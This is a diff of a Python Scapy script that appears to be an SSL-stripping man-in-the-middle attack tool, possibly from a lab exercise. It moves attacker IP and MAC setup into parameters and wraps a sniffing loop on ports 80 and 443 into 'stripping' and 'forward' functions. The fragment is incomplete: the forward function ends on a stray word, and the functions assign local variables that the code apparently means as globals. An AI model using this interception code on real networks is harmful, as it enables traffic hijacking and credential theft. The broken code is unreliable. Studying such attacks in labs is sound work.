@@ -6,8 +6,10 @@ serverIP = "131.155.244.97"
 clientIP = ""
 clientMac = ""
 
-attackerIP = sc.conf.route.route("0.0.0.0")[1]
-attackerMac = sc.get_if_hwaddr(sc.conf.iface)
+attackerIP = ""
+attackerMac = ""
+
+
 
 sc.load_layer("http")
 
@@ -165,6 +167,21 @@ def log_packet(direction, pkt):
     with open("packet_log.txt", "a") as log_file:
         log_file.write(f"[{direction}] {pkt.summary()}\n")
 
+def stripping(cIP, cMAC, sIP, sMAC, aIP, aMAC):
+    clientIP = cIP
+    clientMAC = cMAC
+    serverIP = sIP
+    serverMac = sMAC
+    attackerIP = aIP
+    attackerMac = aMAC
+    while True:
+        sc.sniff(filter="tcp port 80 or tcp port 443", prn=handle_packet, store=False)
 
-while True:
-    sc.sniff(filter="tcp port 80 or tcp port 443", prn=handle_packet, store=False)
+def forward(cIP, cMAC, sIP, sMAC, aIP, aMAC):
+    clientIP = cIP
+    clientMAC = cMAC
+    serverIP = sIP
+    serverMac = sMAC
+    attackerIP = aIP
+    attackerMac = aMAC
+    forwarding
